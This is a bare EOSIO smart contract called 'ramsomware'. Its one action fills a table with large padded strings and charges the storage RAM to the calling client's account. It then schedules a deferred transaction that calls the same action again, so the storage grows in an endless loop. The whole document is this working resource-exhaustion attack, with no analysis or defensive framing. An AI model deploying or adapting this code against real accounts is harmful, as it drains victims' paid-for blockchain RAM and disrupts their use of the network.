#include <eosiolib/action.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/datastream.hpp>
#include <eosiolib/dispatcher.hpp>
#include <eosiolib/eosio.hpp>
// #include <eosiolib/fixed_key.hpp>
// #include <eosiolib/fixedpoint.hpp>
// #include <eosiolib/memory.hpp>
#include <eosiolib/multi_index.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/privileged.hpp>
#include <eosiolib/producer_schedule.hpp>
#include <eosiolib/public_key.hpp>
#include <eosiolib/serialize.hpp>
#include <eosiolib/singleton.hpp>
#include <eosiolib/stdlib.hpp>
#include <eosiolib/symbol.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/varint.hpp>
#include <eosiolib/action.h>
#include <eosiolib/chain.h>
// #include <eosiolib/compiler_builtins.h>
#include <eosiolib/crypto.h>
#include <eosiolib/db.h>
#include <eosiolib/permission.h>
#include <eosiolib/print.h>
#include <eosiolib/privileged.h>
#include <eosiolib/system.h>
#include <eosiolib/transaction.h>
#include <eosiolib/types.h>

using namespace eosio;
using namespace std;

class [[eosio::contract]] ramsomware: public contract{
    private:
        struct [[eosio::table]] person {
            uint64_t key;
            string s0;
            string s1;
            string s2;
            string s3;
            string s4;
            string s5;
            string s6;
            string s7;
            string s8;
            string s9;
            uint64_t primary_key() const { return key; }
        };
        typedef eosio::multi_index<"people"_n, person> address_index;
    public:
        using contract::contract;
        [[eosio::action]]
        void main( name client, uint64_t idx, uint64_t randNum)
        {
        print("[*] Parent Called\n");

        address_index addresses(_code, _code.value);
        auto iterator = addresses.find(idx);
        if( iterator == addresses.end() )
        {
            addresses.emplace(client, [&]( auto& row ) 
            {
                row.key = idx;
                string A = "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEA";
                A = A + A + A+ A + A;
                row.s0 = A;
                row.s1 = A;
                row.s2 = A;
                row.s3 = A;
                row.s4 = A;
                row.s5 = A;
                row.s6 = A;
                row.s7 = A;
                row.s8 = A;
                row.s9 = A;
            });
            printf("SUCCESS SAVE\n");
        }
        transaction out1{};
        out1.actions.emplace_back(permission_level{_self, "active"_n}, _self , "main"_n, std::make_tuple(client, uint64_t(idx+1), uint64_t(randNum)));
	    out1.send(idx+1, "loop"_n, false);
        print("[#] loop  : %d \n ", idx);

    }

};
EOSIO_DISPATCH(ramsomware ,(main))
